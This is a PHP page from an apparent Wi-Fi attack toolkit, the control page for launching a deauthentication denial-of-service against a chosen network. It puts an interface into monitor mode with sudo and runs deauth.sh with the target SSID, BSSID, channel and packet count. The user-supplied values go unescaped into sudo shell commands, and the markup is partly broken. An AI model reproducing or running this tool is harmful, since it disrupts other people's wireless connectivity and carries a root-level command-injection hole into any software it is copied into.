	<h3>By Green Terminal</h3>
<a href="http://www.greenterminal.in">Visit www.greenterminal.in</a>
	<?php
		session_start();
	?>
<html>
<head>
}
?>
<h1>DOS Active</h1>
</head>
<body bgcolor="#E6E6FA">
	<?php
		$freq = $_POST['freq1'];
		$_SESSION['freq'] = $freq;
		echo "DOS running on ";
		echo '<b>' . $_SESSION['eid'] . '</b>' . " with bssid ";
		echo '<b>' . $_SESSION['bid'] . '</b>' . " on channel ";
		echo '<b>' . $_SESSION['chan'] . '</b>' . "from interface ";
		echo '<b>' . $_SESSION['i_face'] . '</b>' . " with count " . '<b>' . $_SESSION['freq'] . '</b>' . '</br>';
		$ssid1=$_SESSION['eid'];
		$bssid1=$_SESSION['bid'];
		$chan1=$_SESSION['chan'];
		$i_face1=$_SESSION['i_face'];
		shell_exec("sudo ifconfig " .$_SESSION['i_face']. " down");
		shell_exec("sudo iwconfig " .$_SESSION['i_face']. " mode monitor");
		shell_exec("sudo ifconfig ". $_SESSION['i_face'] . " up");
		shell_exec("sudo iwconfig ". $_SESSION['i_face'] . " channel " . $_SESSION['chan']);
		$pid1=shell_exec("sudo ./deauth.sh '$ssid1' '$bssid1' '$chan1' '$i_face1' '$freq'");
		echo "Process ID is " . "$pid1";
		$_SESSION["pid"] = $pid1;
		header("Location: deauthstatus.php");

	?>
<form action="stopdos.php" method="post">
<input type="submit" style="width:150px; height:50px; margin-left: 50px; margin-top: 50px;" name="stopdos" value="Stop"><br>
</form>
</body>
</html> 
